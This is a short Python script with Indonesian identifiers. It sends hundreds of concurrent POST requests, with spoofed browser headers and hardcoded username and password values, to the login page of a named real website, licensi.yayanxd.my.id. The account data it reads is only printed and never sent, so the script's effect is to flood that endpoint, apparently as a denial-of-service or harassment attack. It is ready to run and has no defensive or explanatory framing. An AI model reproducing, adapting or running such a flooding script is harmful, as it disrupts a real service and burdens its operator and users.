import requests, random
from concurrent.futures import ThreadPoolExecutor



def mulai(nope,name):
	try:
		headers = {
		    'authority': 'licensi.yayanxd.my.id',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-US,en;q=0.9,id;q=0.8',
		    'cache-control': 'no-cache',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://licensi.yayanxd.my.id',
		    'pragma': 'no-cache',
		    'referer': 'https://licensi.yayanxd.my.id/login.php',
		    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
		}

		data = {
		    'username': 'babasid',
		    'password': 'babsidx',
		    'submit': 'ok',
		}

		response = requests.post('https://licensi.yayanxd.my.id/login.php', headers=headers, data=data)
		print('Status : %s, %s|%s'%(response.status_code,nope,name))

	except Exception as e:
		print(e)


for x in open('account.txt', 'r').readlines():
	nope,name = x.split('|')[0],x.split('|')[1].replace('\n','')
	with ThreadPoolExecutor(max_workers=100) as gasken:
		for i in range(100):
			gasken.submit(mulai, nope, name)
